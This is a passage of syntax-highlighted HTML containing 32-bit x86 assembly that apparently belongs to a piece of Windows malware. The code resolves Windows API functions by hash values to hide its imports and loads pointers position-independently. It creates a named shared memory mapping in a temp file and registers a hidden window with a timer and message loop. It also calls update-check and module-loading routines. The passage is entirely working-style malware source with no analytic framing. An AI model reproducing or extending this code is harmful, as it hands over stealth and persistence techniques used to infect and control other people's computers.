    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">getmaic</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">noproblem</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">

</span><span class="sc5">noproblem</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getmaic</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">00FFFFFFh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">gotintothat</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">gotintothat</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">148f1962h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; gettempath</span><span class="sc0">
    
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">0A897A690h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; gettempfilename</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                  </span><span class="sc1">; open_always</span><span class="sc0">

</span><span class="sc5">loaditagain</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">03</span><span class="sc0">              </span><span class="sc1">; file sharing</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0C0000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">0193E83EEh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; CreateFileA</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">makethatthat</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">skiploading</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loaditagain</span><span class="sc0">

</span><span class="sc5">makethatthat</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'ce0'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">filsize</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0">    </span><span class="sc2">097E2AF98h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; CreateFileMapping</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">startfromhere</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000F001Fh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0">    </span><span class="sc2">03D547DB1h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; MapViewOfFile</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">sfmskipit</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">nullsize</span><span class="sc0">
    </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'!CeC'</span><span class="sc0">

</span><span class="sc5">sfmskipit</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8096</span><span class="sc4">+(</span><span class="sc5">structfil</span><span class="sc4">*</span><span class="sc2">5000</span><span class="sc4">)],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">filsize</span><span class="sc4">-</span><span class="sc5">bankcommsize</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetMappedFile</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">1017d1A1h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;GetModuleHAndle</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc12">'0EC'</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">      

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc5">winproc</span><span class="sc4">,</span><span class="sc5">t1</span><span class="sc0">      </span><span class="sc1">; window proc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Module handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">            
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">          </span><span class="sc1">; name</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">0D48A96AAh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; RegisterClassA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'VD0'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">7099fb9ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; CreateWindowEx</span><span class="sc0">

    </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">windowproc01</span><span class="sc4">,</span><span class="sc5">g354</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetMappedFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VersionDirty</span><span class="sc4">,</span><span class="sc5">popo2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">WM_REGCLIENT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">0FBAC7F60h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; SendMessageA</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">061a186d0h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; SetTimer</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">gohere1</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetMappedFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">gohere1</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckUpdated</span><span class="sc0">            </span><span class="sc1">; Check update consistency</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModuleCall</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">   

</span><span class="sc5">gohere</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">44</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">03BAC79F3h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; GetMessageA</span><span class="sc0">

</span><span class="sc5">gomimi</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">gomimi1</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">050d9920Ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; TranslateMessageA</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">05BFFA45Ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; dispatchMessageA</span><span class="sc0">

</span><span class="sc5">skiski</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">44</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gohere</span><span class="sc0">
    
</span><span class="sc5">gomimi1</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">790c0575h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; ExitThread</span><span class="sc0">

</span><span class="sc5">SetMappedFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getitmap</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">getitmap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">mapped</span><span class="sc4">-</span><span class="sc5">getitmap</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetMappedFile</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getitmap1</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">getitmap1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
